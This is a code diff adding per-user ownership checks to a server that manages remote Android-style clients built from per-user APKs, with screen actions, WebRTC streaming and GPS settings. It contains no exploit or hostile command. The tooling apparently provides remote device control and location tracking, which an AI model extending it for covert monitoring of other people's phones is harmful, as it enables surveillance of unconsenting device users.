@@ -1,5 +1,5 @@
 import { getDb, dbHelpers } from '../db/index.js';
-import { clients } from '../db/schema.js';
+import { clients, users, buildRecords } from '../db/schema.js';
 import { eq, desc } from 'drizzle-orm';
 import { socketService } from '../services/socket.js';
 import { CMD, SCREEN_ACTION } from '../types/index.js';
@@ -161,10 +161,18 @@ export async function deviceRoutes(app) {
     });
     app.get('/api/clients', {
         preHandler: [app.auth, requirePermission('device:view')],
-    }, async () => {
+    }, async (request) => {
         const d = getDb();
-        const allClients = d.select().from(clients).orderBy(desc(clients.online), desc(clients.lastSeen)).all();
-        const formatted = allClients.map(formatClient);
+        const user = request.user;
+        let rows;
+        if (user?.role === 'admin' || user?.permissions?.includes('users:manage')) {
+            // Join with builds/creator where available to show which user created the APK
+            rows = d.select().from(clients).orderBy(desc(clients.online), desc(clients.lastSeen)).all(); // admin: show all clients (owner info resolved in formatClientWithOwner)
+        }
+        else {
+            rows = d.select().from(clients).where(eq(clients.ownerId, user?.userId)).orderBy(desc(clients.online), desc(clients.lastSeen)).all();
+        }
+        const formatted = rows.map(r => formatClientWithOwner(r));
         return {
             success: true,
             data: {
@@ -180,11 +188,19 @@ export async function deviceRoutes(app) {
     }, async (request, reply) => {
         const { id } = request.params;
         const d = getDb();
+        const user = request.user;
         const client = d.select().from(clients).where(eq(clients.id, id)).get();
         if (!client) {
             return reply.code(404).send({ success: false, error: 'Client not found' });
         }
-        return { success: true, data: formatClient(client) };
+        if (user?.role !== 'admin') {
+            // Non-admins can only access their own devices; support legacy snake_case rows too
+            const rowOwnerId = client.ownerId ?? client.owner_id;
+            if (!rowOwnerId || rowOwnerId !== user.userId) {
+                return reply.code(403).send({ success: false, error: 'Not allowed' });
+            }
+        }
+        return { success: true, data: formatClientWithOwner(client) };
     });
     app.get('/api/client/:id/webrtc-config', {
         preHandler: [app.auth, async (request, reply) => {
@@ -289,6 +305,27 @@ export async function deviceRoutes(app) {
         deleteDeviceCredential(id);
         dbHelpers.addLog('INFO', 'CLIENT', `Client ${id} deleted`);
         return { success: true, message: 'Client deleted' };
+    });
+    // Admin: set or clear owner for a client
+    app.post('/api/client/:id/owner', {
+        preHandler: [app.auth, requirePermission('users:manage')],
+    }, async (request, reply) => {
+        const { id } = request.params;
+        const body = (request.body || {});
+        const ownerId = typeof body.ownerId === 'number' ? body.ownerId : null;
+        const d = getDb();
+        const client = d.select().from(clients).where(eq(clients.id, id)).get();
+        if (!client)
+            return reply.code(404).send({ success: false, error: 'Client not found' });
+        if (ownerId !== null) {
+            const user = d.select().from(users).where(eq(users.id, ownerId)).get();
+            if (!user)
+                return reply.code(404).send({ success: false, error: 'User not found' });
+        }
+        // Use Drizzle camelCase property names (ownerId). Keep null allowed to clear owner.
+        d.update(clients).set({ ownerId }).where(eq(clients.id, id)).run();
+        dbHelpers.addLog('ADMIN', 'CLIENT', `Owner for client ${id} set to ${ownerId}`);
+        return { success: true };
     });
     app.post('/api/client/:id/credential/rotate', {
         preHandler: [app.auth, requirePermission('device:command')],
@@ -540,5 +577,41 @@ export function formatClient(client) {
         currentPath: client.currentPath,
         gpsInterval: client.gpsInterval,
     };
+}
+export function formatClientWithOwner(client) {
+    const base = formatClient(client);
+    // owner_id / ownerId may be undefined in older DB rows; normalize to owner: null or { id, username }
+    const ownerId = client.ownerId ?? client.owner_id ?? client.creatorId ?? client.creator_id ?? null;
+    // If no explicit ownerId but client has build_id, try to resolve build's creator
+    if (!ownerId) {
+        try {
+            const d = getDb();
+            const buildId = client.buildId ?? client.build_id;
+            if (buildId) {
+                const build = d.select().from(buildRecords).where(eq(buildRecords.id, buildId)).get();
+                if (build?.creatorId || build?.creator_id) {
+                    const bOwnerId = build.creatorId ?? build.creator_id;
+                    const owner = d.select().from(users).where(eq(users.id, bOwnerId)).get();
+                    if (owner)
+                        return { ...base, owner: { id: owner.id, username: owner.username, email: owner.email } };
+                }
+            }
+        }
+        catch (e) {
+            // ignore lookup errors
+        }
+    }
+    if (!ownerId)
+        return { ...base, owner: null };
+    try {
+        const d = getDb();
+        const owner = d.select().from(users).where(eq(users.id, ownerId)).get();
+        if (!owner)
+            return { ...base, owner: null };
+        return { ...base, owner: { id: owner.id, username: owner.username, email: owner.email } };
+    }
+    catch {
+        return { ...base, owner: null };
+    }
 }
 //# sourceMappingURL=device.js.map
